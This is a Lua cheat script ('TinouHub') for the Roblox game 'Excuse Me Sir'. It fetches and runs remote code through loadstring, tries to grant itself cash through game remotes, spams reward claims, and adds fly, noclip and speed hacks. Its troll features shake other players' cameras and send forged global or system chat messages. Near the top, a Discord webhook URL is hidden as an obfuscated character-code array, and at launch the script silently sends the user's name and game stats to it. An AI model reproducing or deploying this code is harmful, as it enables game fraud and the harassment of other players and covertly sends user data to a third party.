local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local player       = game:GetService("Players").LocalPlayer
local RS           = game:GetService("ReplicatedStorage")
local RunService   = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local HS           = game:GetService("HttpService")
local VU           = game:GetService("VirtualUser")

local VERSION  = "0.1.0"
local SAVE_FILE = "tinouhub_ems_config.json"

-- ── Config ──────────────────────────────────────────────────────────────────
local AUTO_OFFLINE   = true
local AUTO_CRATE     = false
local CRATE_TYPE     = "WoodenCrate"
local CRATE_DELAY    = 0.5
local AUTO_REBIRTH   = false
local REBIRTH_AT     = 1000
local AUTO_POTION    = false
local ANTI_AFK       = true
local WEBHOOK_URL    = ""
local LOG_WEBHOOK    = (function() local t={104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,48,51,56,48,49,57,52,54,54,52,57,52,51,55,52,57,47,84,86,51,113,75,74,115,120,51,83,117,88,117,114,66,51,120,118,108,45,120,104,84,71,99,48,49,102,117,112,56,108,86,48,88,67,71,56,80,74,68,68,89,97,119,71,111,48,97,68,121,83,113,86,75,101,54,84,45,108,48,72,97,45,122,114,78,99} local s="" for _,c in ipairs(t) do s=s..string.char(c) end return s end)()

local function saveConfig()
    pcall(function()
        writefile(SAVE_FILE, HS:JSONEncode({
            auto_offline = AUTO_OFFLINE,
            auto_crate   = AUTO_CRATE,
            crate_type   = CRATE_TYPE,
            crate_delay  = CRATE_DELAY,
            auto_rebirth = AUTO_REBIRTH,
            rebirth_at   = REBIRTH_AT,
            auto_potion  = AUTO_POTION,
            anti_afk     = ANTI_AFK,
            webhook      = WEBHOOK_URL,
        }))
    end)
end

local function loadConfig()
    pcall(function()
        if not isfile(SAVE_FILE) then return end
        local d = HS:JSONDecode(readfile(SAVE_FILE))
        if d.auto_offline ~= nil then AUTO_OFFLINE  = d.auto_offline  end
        if d.auto_crate   ~= nil then AUTO_CRATE    = d.auto_crate    end
        if d.crate_type   ~= nil then CRATE_TYPE    = d.crate_type    end
        if d.crate_delay  ~= nil then CRATE_DELAY   = d.crate_delay   end
        if d.auto_rebirth ~= nil then AUTO_REBIRTH  = d.auto_rebirth  end
        if d.rebirth_at   ~= nil then REBIRTH_AT    = d.rebirth_at    end
        if d.auto_potion  ~= nil then AUTO_POTION   = d.auto_potion   end
        if d.anti_afk     ~= nil then ANTI_AFK      = d.anti_afk      end
        if d.webhook      ~= nil then WEBHOOK_URL   = d.webhook       end
    end)
end

loadConfig()

-- ── Remote cache ────────────────────────────────────────────────────────────
local _rc = {}
local function R(name)
    if not _rc[name] then _rc[name] = RS:FindFirstChild(name, true) end
    return _rc[name]
end

-- ── Leaderstats helpers ──────────────────────────────────────────────────────
local function getLeaderstat(name)
    local ls = player:FindFirstChild("leaderstats")
    if not ls then return nil end
    local v = ls:FindFirstChild(name)
    return v and v.Value
end

local function getCoins()
    return getLeaderstat("Coins") or getLeaderstat("Cash") or getLeaderstat("Gold") or 0
end

local function getRebirths()
    return getLeaderstat("Rebirths") or getLeaderstat("Prestige") or 0
end

-- ── Anti-AFK ────────────────────────────────────────────────────────────────
player.Idled:Connect(function()
    if ANTI_AFK then VU:CaptureController() VU:ClickButton2(Vector2.new()) end
end)
task.spawn(function()
    while true do
        task.wait(55)
        if ANTI_AFK then
            local cam = workspace.CurrentCamera
            VU:Button2Down(cam.ViewportSize/2, cam.CFrame)
            task.wait(0.1)
            VU:Button2Up(cam.ViewportSize/2, cam.CFrame)
        end
    end
end)

-- ── Offline Earnings ─────────────────────────────────────────────────────────
local function claimOfflineEarnings()
    pcall(function()
        local re = R("OfflineEarningsClaim")
        if not re then return end
        if re:IsA("RemoteEvent") then
            re:FireServer()
        elseif re:IsA("RemoteFunction") then
            re:InvokeServer()
        end
    end)
end

if AUTO_OFFLINE then
    task.spawn(function()
        task.wait(3)
        claimOfflineEarnings()
        Rayfield:Notify({Title="Offline Earnings", Content="Claimed!", Duration=3})
    end)
end

-- ── Rebirth ──────────────────────────────────────────────────────────────────
local function doRebirth()
    local ok = false
    pcall(function()
        local rf = R("PanelFunction")
        if rf then rf:InvokeServer("Rebirth") ok = true return end
    end)
    if not ok then pcall(function()
        local re = R("PanelAction")
        if re then re:FireServer("Rebirth") ok = true end
    end) end
    if not ok then pcall(function()
        local re = R("TeleportRemote")
        if re then re:FireServer("Rebirth") end
    end) end
    return ok
end

-- ── Crates ───────────────────────────────────────────────────────────────────
local crateTypes = {"WoodenCrate","SilverCrate","DiamondCrate","RubyCrate","GoldenCrate"}
local crateRunning = false

local function openCrate(cType)
    pcall(function()
        local re = R("CrateRemote")
        if re then re:FireServer("Open", cType) return end
    end)
    pcall(function()
        local re = R("CrateRemote")
        if re then re:FireServer(cType) end
    end)
end

-- ── Potions ───────────────────────────────────────────────────────────────────
local potionTypes = {"coin potion","Luck potion","V1Potion"}
local selectedPotion = "coin potion"

local function usePotion(pType)
    pcall(function()
        local re = R("PotionUpdate")
        if re then re:FireServer("Use", pType) end
    end)
    pcall(function()
        local rf = R("PotionStateRequest")
        if rf then rf:InvokeServer("Use", pType) end
    end)
end

local function buyPotion(pType)
    -- Try shop remote first
    pcall(function()
        local re = R("Shop")
        if re then re:FireServer("Buy", pType) end
    end)
    pcall(function()
        local rf = R("PanelFunction")
        if rf then rf:InvokeServer("BuyPotion", pType) end
    end)
end

-- ── OP: Try to get Cash via remotes ──────────────────────────────────────────
-- The server almost certainly validates these, but worth trying
local function tryCashRemote(amount)
    local tried = {}
    -- Pattern 1: direct Cash FireServer
    pcall(function()
        local re = R("Cash")
        if re then re:FireServer(amount) table.insert(tried, "Cash FireServer") end
    end)
    -- Pattern 2: CashClient (usually server→client, but try)
    pcall(function()
        local re = R("CashClient")
        if re then re:FireServer(amount) table.insert(tried, "CashClient FireServer") end
    end)
    -- Pattern 3: PanelAction with cash action
    pcall(function()
        local re = R("PanelAction")
        if re then re:FireServer("GiveCash", amount) re:FireServer("AddCash", amount) end
    end)
    -- Pattern 4: SP remote (stat points or special points?)
    pcall(function()
        local re = R("SP")
        if re then re:FireServer(amount) end
    end)
    return tried
end

-- ── OP: Claim starter pack (may be re-claimable) ─────────────────────────────
local function claimStarterPack()
    pcall(function()
        local re = R("StarterPackRemote")
        if re then re:FireServer() re:FireServer("Claim") re:FireServer("Buy") end
    end)
end

-- ── OP: Spam offline earnings claim ──────────────────────────────────────────
local offlineSpamming = false
local function spamOfflineClaim(lbl)
    offlineSpamming = true
    task.spawn(function()
        local count = 0
        while offlineSpamming do
            claimOfflineEarnings()
            count = count + 1
            pcall(function() lbl:Set("Offline spam: "..count.." claims") end)
            task.wait(0.2)
        end
    end)
end

-- ── Fly (client-side BodyVelocity) ───────────────────────────────────────────
local flyEnabled = false
local flyBody = nil
local flyGyro = nil
local FLY_SPEED = 50
local flyConn = nil

local function enableFly()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    flyBody = Instance.new("BodyVelocity", hrp)
    flyBody.MaxForce = Vector3.new(1e9,1e9,1e9)
    flyBody.Velocity  = Vector3.zero

    flyGyro = Instance.new("BodyGyro", hrp)
    flyGyro.MaxTorque = Vector3.new(1e9,1e9,1e9)
    flyGyro.P = 1e6

    local cam = workspace.CurrentCamera
    flyConn = RunService.Heartbeat:Connect(function()
        if not flyEnabled then return end
        local dir = Vector3.zero
        if UIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.Space)  then dir = dir + Vector3.yAxis end
        if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.yAxis end
        flyBody.Velocity  = dir * FLY_SPEED
        flyGyro.CFrame    = cam.CFrame
    end)

    -- Also try server-side FlyRemote
    pcall(function()
        local re = R("FlyRemote")
        if re then re:FireServer(true) end
    end)
end

local function disableFly()
    if flyBody then flyBody:Destroy() flyBody = nil end
    if flyGyro  then flyGyro:Destroy()  flyGyro  = nil end
    if flyConn  then flyConn:Disconnect() flyConn = nil end
    pcall(function()
        local re = R("FlyRemote")
        if re then re:FireServer(false) end
    end)
end

-- ── Noclip ───────────────────────────────────────────────────────────────────
local noclipEnabled = false
local noclipConn = nil

-- ── Speed & Jump ─────────────────────────────────────────────────────────────
local function getHum()
    local c = player.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end

-- ── Status webhook ───────────────────────────────────────────────────────────
local function sendWebhook(title, desc, color)
    if WEBHOOK_URL == "" then return end
    pcall(function()
        request({
            Url = WEBHOOK_URL, Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HS:JSONEncode({
                username = "TinouHUB",
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png",
                embeds = {{
                    title = title,
                    description = desc,
                    color = color or 3447003,
                    footer = { text = "TinouHub v"..VERSION.." · Excuse Me Sir" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
        })
    end)
end

-- ── Log ──────────────────────────────────────────────────────────────────────
pcall(function()
    request({
        Url = LOG_WEBHOOK, Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = HS:JSONEncode({
            username = "TinouHub Logger",
            embeds = {{
                title = "Script Executed",
                description = "**"..player.Name.."** launched TinouHub v"..VERSION.." on Excuse Me Sir",
                color = 3447003,
                fields = {
                    { name = "Coins",    value = tostring(getCoins()),    inline = true },
                    { name = "Rebirths", value = tostring(getRebirths()), inline = true },
                    { name = "Server",   value = tostring(#game:GetService("Players"):GetPlayers()).." players", inline = true },
                },
                footer = { text = "TinouHub v"..VERSION },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            }}
        })
    })
end)

-- ════════════════════════════════════════════════════════════════════════════
--  GUI
-- ════════════════════════════════════════════════════════════════════════════
local Window = Rayfield:CreateWindow({
    Name            = "TinouHub | Excuse Me Sir",
    LoadingTitle    = "TinouHub v"..VERSION,
    LoadingSubtitle = "Excuse Me Sir",
    ConfigurationSaving = { Enabled = false },
    KeySystem       = true,
    KeySettings     = {
        Title    = "TinouHub",
        Subtitle = "Key System",
        Note     = "Ask ImTinou for your key",
        FileName = "TinouHubKey",
        SaveKey  = true,
        GrabKeyFromSite = false,
        Key      = {"tinoukey1", "tinoukey2", "tinoukey3"},
    },
})

-- ═══════════════════════ TAB: AUTO ══════════════════════════════════════════
local AutoTab = Window:CreateTab("Auto", "zap")

AutoTab:CreateSection("Offline Earnings")
AutoTab:CreateToggle({ Name="Auto-Claim au démarrage", CurrentValue=AUTO_OFFLINE, Flag="AutoOffline",
    Callback=function(v) AUTO_OFFLINE=v saveConfig() end })
AutoTab:CreateButton({ Name="Claim maintenant", Callback=function()
    claimOfflineEarnings()
    Rayfield:Notify({Title="Offline Earnings", Content="Claimed!", Duration=2})
end })

AutoTab:CreateSection("Crates")
AutoTab:CreateDropdown({ Name="Type de crate", Options=crateTypes, CurrentOption=CRATE_TYPE, MultipleOptions=false, Flag="CrateType",
    Callback=function(o) CRATE_TYPE = type(o)=="table" and o[1] or o saveConfig() end })
AutoTab:CreateSlider({ Name="Délai entre ouvertures (s)", Range={0.1,3}, Increment=0.1, CurrentValue=CRATE_DELAY, Flag="CrateDelay",
    Callback=function(v) CRATE_DELAY=v saveConfig() end })

local crateStatusLbl = AutoTab:CreateLabel("Crates: Idle")
AutoTab:CreateButton({ Name="Ouvrir 1 crate", Callback=function()
    openCrate(CRATE_TYPE)
    Rayfield:Notify({Title="Crate", Content="Ouvert: "..CRATE_TYPE, Duration=2})
end })
AutoTab:CreateToggle({ Name="Auto-Open Crate (loop)", CurrentValue=AUTO_CRATE, Flag="AutoCrate",
    Callback=function(v)
        AUTO_CRATE=v saveConfig()
        if v then
            task.spawn(function()
                local count = 0
                while AUTO_CRATE do
                    openCrate(CRATE_TYPE)
                    count = count + 1
                    pcall(function() crateStatusLbl:Set("Crates ouverts: "..count) end)
                    task.wait(CRATE_DELAY)
                end
                pcall(function() crateStatusLbl:Set("Crates: Stopped | Total: "..count) end)
            end)
        end
    end
})

AutoTab:CreateSection("Rebirth")
AutoTab:CreateSlider({ Name="Rebirth quand Coins >=", Range={100,1000000}, Increment=100, CurrentValue=REBIRTH_AT, Flag="RebirthAt",
    Callback=function(v) REBIRTH_AT=v saveConfig() end })

local rebirthStatusLbl = AutoTab:CreateLabel("Rebirth: Idle | Rebirths: "..tostring(getRebirths()))
AutoTab:CreateButton({ Name="Rebirth maintenant", Callback=function()
    local ok = doRebirth()
    Rayfield:Notify({Title="Rebirth", Content=ok and "Fait!" or "Remote introuvable/refusé", Duration=3})
end })
AutoTab:CreateToggle({ Name="Auto-Rebirth", CurrentValue=AUTO_REBIRTH, Flag="AutoRebirth",
    Callback=function(v)
        AUTO_REBIRTH=v saveConfig()
        if v then
            task.spawn(function()
                while AUTO_REBIRTH do
                    task.wait(1)
                    local coins = getCoins()
                    if coins >= REBIRTH_AT then
                        local ok = doRebirth()
                        if ok then
                            local r = getRebirths()
                            pcall(function() rebirthStatusLbl:Set("Rebirths: "..r) end)
                            Rayfield:Notify({Title="Rebirth", Content="Rebirth #"..r.."!", Duration=3})
                            sendWebhook("🔄 Auto-Rebirth", "**"..player.Name.."** — Rebirth #"..r, 16766720)
                            task.wait(2)
                        end
                    else
                        pcall(function() rebirthStatusLbl:Set("Coins: "..coins.." / "..REBIRTH_AT) end)
                    end
                end
                pcall(function() rebirthStatusLbl:Set("Rebirth: Stopped") end)
            end)
        end
    end
})

AutoTab:CreateSection("Potions")
AutoTab:CreateDropdown({ Name="Type de potion", Options={"coin potion","Luck potion","V1Potion"}, CurrentOption="coin potion", MultipleOptions=false, Flag="PotionType",
    Callback=function(o) selectedPotion = type(o)=="table" and o[1] or o end })
AutoTab:CreateButton({ Name="Utiliser potion", Callback=function()
    usePotion(selectedPotion)
    Rayfield:Notify({Title="Potion", Content="Used: "..selectedPotion, Duration=2})
end })
AutoTab:CreateButton({ Name="Acheter potion", Callback=function()
    buyPotion(selectedPotion)
    Rayfield:Notify({Title="Potion", Content="Buy attempt: "..selectedPotion, Duration=2})
end })

-- ═══════════════════════ TAB: OP ════════════════════════════════════════════
local OpTab = Window:CreateTab("OP", "star")

OpTab:CreateSection("⚠️ Expérimental — validé côté serveur")
OpTab:CreateLabel("Les remotes Cash sont probablement validées serveur.")
OpTab:CreateLabel("Ça vaut quand même le coup d'essayer !")

local cashStatusLbl = OpTab:CreateLabel("Cash remote: —")
OpTab:CreateButton({ Name="Try Give Cash (1M)", Callback=function()
    local tried = tryCashRemote(1000000)
    local msg = "Tentatives: "..table.concat(tried, ", ")
    pcall(function() cashStatusLbl:Set(msg) end)
    Rayfield:Notify({Title="Cash Remote", Content=msg, Duration=4})
end })

OpTab:CreateButton({ Name="Try Give Cash (1B)", Callback=function()
    local tried = tryCashRemote(1000000000)
    Rayfield:Notify({Title="Cash Remote", Content="#tried="..#tried, Duration=3})
end })

OpTab:CreateSection("Offline Earnings Spam")
local offlineSpamLbl = OpTab:CreateLabel("Spam: Idle")
OpTab:CreateButton({ Name="Start Spam Offline Claim", Callback=function()
    if not offlineSpamming then
        spamOfflineClaim(offlineSpamLbl)
        Rayfield:Notify({Title="Offline Spam", Content="Démarré!", Duration=2})
    end
end })
OpTab:CreateButton({ Name="Stop Spam", Callback=function()
    offlineSpamming = false
    pcall(function() offlineSpamLbl:Set("Spam: Stopped") end)
    Rayfield:Notify({Title="Offline Spam", Content="Arrêté.", Duration=2})
end })

OpTab:CreateSection("Starter Pack & Divers")
OpTab:CreateButton({ Name="Claim Starter Pack", Callback=function()
    claimStarterPack()
    Rayfield:Notify({Title="Starter Pack", Content="Claim envoyé!", Duration=2})
end })

OpTab:CreateButton({ Name="Group Reward Claim", Callback=function()
    pcall(function()
        local re = R("GroupCheckEvent")
        if re then re:FireServer() re:FireServer("Claim") end
    end)
    Rayfield:Notify({Title="Group Reward", Content="Claim envoyé!", Duration=2})
end })

-- ═══════════════════════ TAB: PLAYER ════════════════════════════════════════
local PlayerTab = Window:CreateTab("Player", "user")

PlayerTab:CreateSection("Movement")
PlayerTab:CreateSlider({ Name="WalkSpeed", Range={16,500}, Increment=4, CurrentValue=16, Flag="WalkSpeed",
    Callback=function(v)
        pcall(function()
            local hum = getHum()
            if hum then hum.WalkSpeed = v end
        end)
    end
})
PlayerTab:CreateSlider({ Name="JumpPower", Range={50,1000}, Increment=50, CurrentValue=50, Flag="JumpPower",
    Callback=function(v)
        pcall(function()
            local hum = getHum()
            if hum then hum.JumpPower = v end
        end)
    end
})
PlayerTab:CreateSlider({ Name="Fly Speed", Range={10,500}, Increment=10, CurrentValue=50, Flag="FlySpeed",
    Callback=function(v) FLY_SPEED=v end })

PlayerTab:CreateToggle({ Name="Fly (WASD + Space/Ctrl)", CurrentValue=false, Flag="FlyEnabled",
    Callback=function(v)
        flyEnabled = v
        if v then enableFly() Rayfield:Notify({Title="Fly", Content="ON — WASD pour voler", Duration=3})
        else disableFly() Rayfield:Notify({Title="Fly", Content="OFF", Duration=2}) end
    end
})

PlayerTab:CreateToggle({ Name="Noclip", CurrentValue=false, Flag="NoclipEnabled",
    Callback=function(v)
        noclipEnabled = v
        if v then
            if not noclipConn then
                noclipConn = RunService.Stepped:Connect(function()
                    if not noclipEnabled then return end
                    local char = player.Character
                    if not char then return end
                    for _, p in pairs(char:GetDescendants()) do
                        if p:IsA("BasePart") then p.CanCollide = false end
                    end
                end)
            end
            Rayfield:Notify({Title="Noclip", Content="ON", Duration=2})
        else
            if noclipConn then noclipConn:Disconnect() noclipConn = nil end
            local char = player.Character
            if char then
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = true end
                end
            end
            Rayfield:Notify({Title="Noclip", Content="OFF", Duration=2})
        end
    end
})

PlayerTab:CreateToggle({ Name="Infinite Jump", CurrentValue=false, Flag="InfJump",
    Callback=function(v)
        if v then
            UIS.JumpRequest:Connect(function()
                local hum = getHum()
                if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            end)
            Rayfield:Notify({Title="Infinite Jump", Content="ON", Duration=2})
        end
    end
})

-- Respawn: reset values
player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    if flyEnabled then enableFly() end
    if noclipEnabled then
        noclipConn = RunService.Stepped:Connect(function()
            if not noclipEnabled then return end
            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = false end
            end
        end)
    end
end)

-- ═══════════════════════ TAB: EXTRAS ════════════════════════════════════════
local ExtrasTab = Window:CreateTab("Extras", "gift")

ExtrasTab:CreateSection("Compensation (rewards gratuits)")
local compLbl = ExtrasTab:CreateLabel("Compensation: —")
ExtrasTab:CreateButton({ Name="Check + Claim Compensation", Callback=function()
    local got = false
    pcall(function()
        local re = R("CheckCompensation")
        if re then re:FireServer() end
    end)
    pcall(function()
        local re = R("ClaimCompensation")
        if re then re:FireServer() got = true end
    end)
    pcall(function() compLbl:Set("Claimed! (" .. os.date("%H:%M:%S") .. ")") end)
    Rayfield:Notify({Title="Compensation", Content=got and "Claim envoyé!" or "Remote introuvable", Duration=3})
end })

local compSpamming = false
local compCount = 0
ExtrasTab:CreateButton({ Name="Spam Claim Compensation", Callback=function()
    if compSpamming then return end
    compSpamming = true
    compCount = 0
    task.spawn(function()
        while compSpamming do
            pcall(function()
                local re = R("ClaimCompensation")
                if re then re:FireServer() compCount = compCount + 1 end
            end)
            pcall(function() compLbl:Set("Compensation spam: " .. compCount) end)
            task.wait(0.3)
        end
    end)
    Rayfield:Notify({Title="Compensation", Content="Spam démarré!", Duration=2})
end })
ExtrasTab:CreateButton({ Name="Stop Spam", Callback=function()
    compSpamming = false
    Rayfield:Notify({Title="Compensation", Content="Arrêté ("..compCount.." claims)", Duration=2})
end })

ExtrasTab:CreateSection("Player Data (lire les stats)")
local dataLbl = ExtrasTab:CreateLabel("Data: —")
ExtrasTab:CreateButton({ Name="Lire mes données", Callback=function()
    pcall(function()
        local rf = R("GetPlayerData")
        if not rf then Rayfield:Notify({Title="GetPlayerData", Content="Remote introuvable", Duration=3}) return end
        local data = rf:InvokeServer()
        if type(data) == "table" then
            local lines = {}
            for k, v in pairs(data) do
                if type(v) ~= "table" then
                    table.insert(lines, k..": "..tostring(v))
                end
            end
            local str = table.concat(lines, " | ")
            pcall(function() dataLbl:Set(str:sub(1, 100)) end)
            Rayfield:Notify({Title="Player Data", Content=str:sub(1, 200), Duration=8})
        elseif data ~= nil then
            local str = tostring(data)
            pcall(function() dataLbl:Set(str:sub(1,100)) end)
            Rayfield:Notify({Title="Player Data", Content=str, Duration=5})
        else
            Rayfield:Notify({Title="Player Data", Content="Retourné nil", Duration=3})
        end
    end)
end })

ExtrasTab:CreateSection("Troll")

local shakeTarget = ""
ExtrasTab:CreateInput({ Name="Pseudo cible (vide = tous)", PlaceholderText="NomDuJoueur", RemoveTextAfterFocusLost=false, Flag="ShakeTarget",
    Callback=function(v) shakeTarget = v end })

ExtrasTab:CreateButton({ Name="CameraShake sur la cible", Callback=function()
    pcall(function()
        local re = R("CameraShake")
        if not re then Rayfield:Notify({Title="CameraShake", Content="Remote introuvable", Duration=3}) return end
        if shakeTarget ~= "" then
            local target = game:GetService("Players"):FindFirstChild(shakeTarget)
            if target then
                re:FireServer(target)
                re:FireServer(target, 10, 1)
            else
                Rayfield:Notify({Title="CameraShake", Content="Joueur introuvable", Duration=3})
                return
            end
        else
            re:FireServer()
            re:FireServer(10, 1)
        end
        Rayfield:Notify({Title="CameraShake", Content="Envoyé!", Duration=2})
    end)
end })

local globalMsg = ""
ExtrasTab:CreateInput({ Name="Message global", PlaceholderText="Ton message...", RemoveTextAfterFocusLost=false, Flag="GlobalMsg",
    Callback=function(v) globalMsg = v end })

ExtrasTab:CreateButton({ Name="Envoyer GlobalMessage", Callback=function()
    if globalMsg == "" then Rayfield:Notify({Title="GlobalMessage", Content="Message vide!", Duration=2}) return end
    local sent = false
    pcall(function()
        local re = R("GlobalMessage")
        if re then re:FireServer(globalMsg) sent = true end
    end)
    if not sent then pcall(function()
        local re = R("GlobalMessageBroadcast")
        if re then re:FireServer(globalMsg) sent = true end
    end) end
    Rayfield:Notify({Title="GlobalMessage", Content=sent and "Envoyé: "..globalMsg or "Remote introuvable", Duration=3})
end })

ExtrasTab:CreateButton({ Name="SystemChat message", Callback=function()
    if globalMsg == "" then Rayfield:Notify({Title="SystemChat", Content="Remplis le message d'abord!", Duration=2}) return end
    pcall(function()
        local re = R("SystemChatRemote")
        if re then re:FireServer(globalMsg) end
    end)
    Rayfield:Notify({Title="SystemChat", Content="Envoyé!", Duration=2})
end })

-- ═══════════════════════ TAB: SETTINGS ══════════════════════════════════════
local SettingsTab = Window:CreateTab("Settings", "settings")

SettingsTab:CreateSection("Anti-AFK")
SettingsTab:CreateToggle({ Name="Anti-AFK", CurrentValue=ANTI_AFK, Flag="AntiAFK",
    Callback=function(v) ANTI_AFK=v saveConfig() end })

SettingsTab:CreateSection("Webhook")
local function webhookStatus() return WEBHOOK_URL=="" and "Not configured" or "..."..WEBHOOK_URL:sub(-20) end
local webhookLbl = SettingsTab:CreateLabel(webhookStatus())
SettingsTab:CreateInput({ Name="Webhook URL", PlaceholderText="https://discord.com/api/webhooks/...", RemoveTextAfterFocusLost=false, Flag="WebhookURL",
    Callback=function(val)
        if val=="" then return end
        WEBHOOK_URL=val saveConfig()
        pcall(function() webhookLbl:Set(webhookStatus()) end)
        Rayfield:Notify({Title="Webhook", Content="Sauvegardé!", Duration=2})
    end
})
SettingsTab:CreateButton({ Name="Test Webhook", Callback=function()
    if WEBHOOK_URL=="" then Rayfield:Notify({Title="Webhook", Content="Non configuré!", Duration=3}) return end
    sendWebhook("🧪 Test", "**"..player.Name.."** | Coins: "..getCoins().." | Rebirths: "..getRebirths(), 3447003)
    Rayfield:Notify({Title="Webhook", Content="Envoyé!", Duration=2})
end })

SettingsTab:CreateSection("Config")
SettingsTab:CreateButton({ Name="Sauvegarder", Callback=function() saveConfig() Rayfield:Notify({Title="Config", Content="Sauvegardé!", Duration=2}) end })
SettingsTab:CreateButton({ Name="Charger", Callback=function() loadConfig() Rayfield:Notify({Title="Config", Content="Chargé! Restart pour appliquer.", Duration=3}) end })

SettingsTab:CreateSection("Info")
SettingsTab:CreateLabel("TinouHub v"..VERSION.." | Excuse Me Sir")
SettingsTab:CreateLabel("PlaceId: 135887679143452")
SettingsTab:CreateLabel("github.com/ImTinou/sword")
